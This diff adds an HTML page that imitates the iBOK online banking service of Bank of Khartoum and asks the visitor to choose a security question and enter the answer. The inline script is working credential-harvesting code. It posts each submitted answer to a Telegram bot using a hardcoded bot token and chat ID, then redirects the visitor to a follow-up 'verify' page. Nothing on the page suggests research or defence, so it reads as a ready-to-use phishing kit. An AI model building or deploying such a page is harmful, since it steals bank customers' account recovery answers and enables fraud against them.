@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <title>Form tracking | iBOK</title>
+
+    <style>
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #8393a3;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            min-height: 100vh;
+            color: var(--ink);
+            font-family: Arial, Helvetica, sans-serif;
+            background: #fff;
+        }
+        
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            height: 143px;
+            flex: 0 0 143px;
+            background: var(--red);
+            color: white;
+        }
+        
+        .welcome,
+        .brand {
+            width: min(704px, calc(100% - 40px));
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .welcome {
+            min-height: 36px;
+            margin-top: 11px;
+            border-radius: 24px;
+            background: var(--yellow);
+            color: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 700;
+            box-shadow: 0 2px 5px #a91d1f33;
+        }
+        
+        .brand {
+            margin-top: 11px;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            min-height: 440px;
+            padding: 0 16px 42px;
+            background-color: #f2f5f9;
+            background-image: radial-gradient(#c8d0da 0.85px, transparent 0.85px);
+            background-size: 18px 18px;
+        }
+        
+        .card {
+            width: min(672px, 100%);
+            margin: 15px auto 0;
+            padding: 25px 40px 24px;
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
+        }
+        
+        h1 {
+            margin: 0;
+            color: var(--red);
+            text-align: center;
+            font-size: 24px;
+            line-height: 1.25;
+        }
+        
+        .subtitle {
+            margin: 20px 0 20px;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 700;
+        }
+        
+        .field {
+            margin-bottom: 18px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 11px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .select-wrap,
+        .input-wrap {
+            width: 100%;
+            height: 42px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: var(--field);
+            overflow: hidden;
+        }
+        
+        select,
+        input {
+            width: 100%;
+            height: 100%;
+            padding: 0 16px;
+            border: 0;
+            outline: none;
+            background: transparent;
+            color: var(--muted);
+            font: inherit;
+            font-size: 16px;
+        }
+        
+        select {
+            color: #e23a3e;
+            cursor: pointer;
+        }
+        
+        input::placeholder {
+            color: var(--muted);
+            opacity: 1;
+        }
+        
+        .submit-button {
+            width: 100%;
+            height: 42px;
+            border: 0;
+            border-radius: 10px;
+            background: var(--red);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 2px 4px #0000001c;
+        }
+        
+        .submit-button:hover {
+            background: #d92529;
+        }
+        
+        .submit-button:disabled {
+            background: #f4a3a5;
+            cursor: not-allowed;
+        }
+        
+        .message {
+            display: none;
+            margin-top: 14px;
+            padding: 10px;
+            border-radius: 8px;
+            background: #fff0f0;
+            color: #9c1b20;
+            font-size: 13px;
+            text-align: center;
+        }
+        
+        .message.visible {
+            display: block;
+        }
+        
+        .message.success {
+            background: #eafbe7;
+            color: #1d7a24;
+        }
+        
+        footer {
+            min-height: 56px;
+            padding: 11px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        .support-bubble {
+            position: fixed;
+            left: 31px;
+            bottom: 15px;
+            width: 55px;
+            height: 55px;
+            background-color: #ff0000;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        }
+        
+        .support-bubble i {
+            color: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <header>
+            <div class="welcome">Welcome to iBOK Online Banking service</div>
+            <div class="brand">
+                <div class="brand-name">iBOK</div>
+                <div class="brand-caption">Online Form</div>
+            </div>
+        </header>
+
+        <main>
+            <section class="card" aria-labelledby="form-title">
+                <h1 id="form-title">Follow the form</h1>
+                <p class="subtitle">Please answer the security question.</p>
+
+                <form id="demo-form">
+                    <div class="field">
+                        <label for="question">----Choose a security question---</label>
+                        <div class="select-wrap">
+                            <select id="question" name="question">
+                                <option value="">-- Select Security Question --</option>
+                                <option value="cousin_name">What is your first cousin's name?</option>
+                                <option value="birth_city">What city were you born in?</option>
+                                <option value="graduation_year">What year did you graduate from university?</option>
+                                <option value="childhood_nickname">What was your nickname during your childhood?</option>
+                                <option value="favorite_author">The name of your favorite author?</option>
+                                <option value="favorite_car">The name of your favorite car manufacturer?</option>
+                                <option value="favorite_movie">Which movie is your favorite?</option>
+                                <option value="childhood_friend">Childhood best friend's name?</option>
+                                <option value="license_year">What year did you get your driver's license?</option>
+                                <option value="first_tv_brand">Brand your first TV?</option>
+                                <option value="marriage_year">What year did you get married?</option>
+                                <option value="favorite_football_team">The name of your favorite football team?</option>
+                                <option value="school_name">What is the name of the school you attended?</option>
+                                <option value="first_foreign_country">The name of the first foreign country you visited?</option>
+                                <option value="first_car_brand">What was your first car brand?</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label for="answer">Enter the answer</label>
+                        <div class="input-wrap">
+                            <input id="answer" name="answer" type="text" placeholder="Write your answer here" autocomplete="off" />
+                        </div>
+                    </div>
+
+                    <button class="submit-button" type="submit" id="submit-button">Send</button>
+                    <div class="message" id="message" role="status" aria-live="polite"></div>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            iBOK | Bank of Khartoum 2026<br /> All rights reserved. Bank of Khartoum, iBOK 2026.
+        </footer>
+
+        <div class="support-bubble" aria-label="WhatsApp support" title="WhatsApp support">
+            <i class="fa-brands fa-whatsapp"></i>
+        </div>
+    </div>
+
+    <script>
+        // ===== TELEGRAM CONFIG =====
+        const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc"; // Replace with your Telegram Bot Token from @BotFather
+        const CHAT_ID = "8406078749"; // Replace with your Telegram Chat ID
+        // ===========================
+
+        const form = document.getElementById("demo-form");
+        const message = document.getElementById("message");
+        const question = document.getElementById("question");
+        const answer = document.getElementById("answer");
+        const submitButton = document.getElementById("submit-button");
+
+        form.addEventListener("submit", async(event) => {
+            event.preventDefault();
+
+            const questionText = question.options[question.selectedIndex].text;
+            const answerText = answer.value.trim();
+
+            // Validation
+            if (!question.value) {
+                message.textContent = "Please select a security question.";
+                message.classList.add("visible");
+                message.classList.remove("success");
+                return;
+            }
+
+            if (!answerText) {
+                message.textContent = "Please enter your answer.";
+                message.classList.add("visible");
+                message.classList.remove("success");
+                return;
+            }
+
+            // Build the Telegram message
+            const text =
+                "📩 <b>New Security Form Submission</b>\n\n" +
+                "❓ <b>Question:</b> " + questionText + "\n" +
+                "💬 <b>Answer:</b> " + answerText;
+
+            // Disable button while sending
+            submitButton.disabled = true;
+            submitButton.textContent = "SENDING...";
+            message.classList.remove("visible", "success");
+
+            try {
+                const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                const res = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: "HTML"
+                    })
+                });
+
+                const data = await res.json();
+
+                if (data.ok) {
+                    message.textContent = "Submitted successfully. Redirecting...";
+                    message.classList.add("visible", "success");
+                    form.reset();
+
+                    // Optional: Redirect after successful submission
+                    setTimeout(() => {
+                        window.location.href = "verify.html";
+                    }, 1500);
+                } else {
+                    message.textContent = "Telegram error: " + (data.description || "Unknown error");
+                    message.classList.add("visible");
+                }
+            } catch (err) {
+                console.error("Telegram notification error:", err);
+                message.textContent = "Failed to send. Please check your connection.";
+                message.classList.add("visible");
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = "Send";
+            }
+        });
+    </script>
+</body>
+
+</html>
